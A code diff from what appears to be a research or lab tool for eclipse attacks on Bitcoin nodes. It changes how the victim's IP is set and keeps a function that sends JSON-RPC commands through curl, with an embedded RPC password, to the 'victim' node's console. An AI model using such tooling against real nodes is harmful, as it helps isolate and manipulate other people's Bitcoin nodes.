@@ -165,7 +165,6 @@ def getBandwidth():
 
 # Send commands to the Victim's Bitcoin Core Console
 def bitcoinVictim(cmd):
-	victim_ip = '10.0.2.5'
 	return os.popen('curl --data-binary \'{"jsonrpc":"1.0","id":"curltext","method":"' + cmd + '","params":[]}\' -H \'content-type:text/plain;\' http://cybersec:kZIdeN4HjZ3fp9Lge4iezt0eJrbjSi8kuSuOHeUkEUbQVdf09JZXAAGwF3R5R2qQkPgoLloW91yTFuufo7CYxM2VPT7A5lYeTrodcLWWzMMwIrOKu7ZNiwkrKOQ95KGW8kIuL1slRVFXoFpGsXXTIA55V3iUYLckn8rj8MZHBpmdGQjLxakotkj83ZlSRx1aOJ4BFxdvDNz0WHk1i2OPgXL4nsd56Ph991eKNbXVJHtzqCXUbtDELVf4shFJXame@' + victim_ip + ':8332').read()
 
 def startBitcoin():
@@ -1067,6 +1066,7 @@ def init():
 	eclipsing = input('Is this an eclipse attack? (y/n) ').lower() in ['y', 'yes']
 	print()
 	if eclipsing:
+		victim_ip = input('What is the victim\'s IP? ')
 		eclipse_fake_numpeers = int(input(f'How many FAKE connections would you like? '))
 		eclipse_real_numpeers = int(input(f'How many REAL connections would you like? '))
 		eclipse_drop_rate = float(input(f'What is the packet drop rate (0 to 1)? '))
